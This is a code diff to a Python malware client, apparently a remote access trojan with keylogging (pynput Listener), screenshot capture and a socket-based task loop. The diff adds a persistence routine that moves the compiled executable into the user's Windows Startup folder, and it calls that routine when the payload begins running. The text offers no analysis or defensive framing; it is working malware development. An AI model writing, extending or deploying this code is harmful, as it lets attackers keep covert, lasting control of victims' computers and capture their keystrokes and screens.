@@ -6,6 +6,7 @@ import socket
 import threading
 import collections
 import os
+import shutil
 import requests
 import hashlib
 from pynput.keyboard import Listener
@@ -195,6 +196,19 @@ class Payload():
         except Exception as e:
             log(f"Error: {e}", level='error')
             return "Error taking screenshot"
+        
+    def persistence(self):
+        try:
+            script_name = os.path.basename(os.path.abspath(__file__))
+            script_name = script_name.replace('.py', '.exe')
+            script_path = f"./{script_name}"
+            startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+            if not os.path.exists(os.path.join(startup_folder, script_name)):
+                shutil.move(script_path, startup_folder)
+                log(f"File moved from {script_path} to {startup_folder}")
+        except Exception as e:
+            log(f"Error: {e}", level='error')
+        
             
     def send_task_result(self, task):
         try:
@@ -224,7 +238,7 @@ class Payload():
 
     def run(self):
         host, port = self.connection.getpeername()
-
+        self.persistence()
         while True:
             
             if self.flags.passive.is_set() and not self.flags.connected.is_set():
